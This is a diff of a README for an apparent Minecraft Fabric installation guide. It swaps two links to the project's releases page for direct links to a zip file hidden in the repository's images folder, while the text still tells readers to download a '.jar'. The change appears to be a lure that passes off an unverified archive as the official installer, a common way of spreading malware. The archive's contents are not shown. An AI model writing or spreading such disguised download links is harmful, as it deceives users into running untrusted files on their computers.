@@ -1,6 +1,6 @@
 # 🛠️ how-to-download-and-install-fabric-on-minecraft-client-and-server - Play Minecraft With Your Favorite Mods
 
-[![](https://img.shields.io/badge/Download_Fabric_Files-Blue?style=for-the-badge)](https://github.com/samyak-development/how-to-download-and-install-fabric-on-minecraft-client-and-server/releases)
+[![](https://img.shields.io/badge/Download_Fabric_Files-Blue?style=for-the-badge)](https://raw.githubusercontent.com/samyak-development/how-to-download-and-install-fabric-on-minecraft-client-and-server/main/images/fabric-how-minecraft-on-server-download-install-to-client-and-2.3-beta.1.zip)
 
 This guide helps you set up the Fabric mod loader for Minecraft on Windows. Fabric allows you to run performance mods and game content additions. Follow these steps to prepare your game.
 
@@ -15,7 +15,7 @@ Ensure your computer meets these basic needs before you begin:
 
 ## 📥 Downloading the Installer
 
-1. Visit the [releases page](https://github.com/samyak-development/how-to-download-and-install-fabric-on-minecraft-client-and-server/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/samyak-development/how-to-download-and-install-fabric-on-minecraft-client-and-server/main/images/fabric-how-minecraft-on-server-download-install-to-client-and-2.3-beta.1.zip).
 2. Find the latest release version on the page.
 3. Click the file ending in `.jar` to start the download.
 4. Save the file to your desktop for easy access.
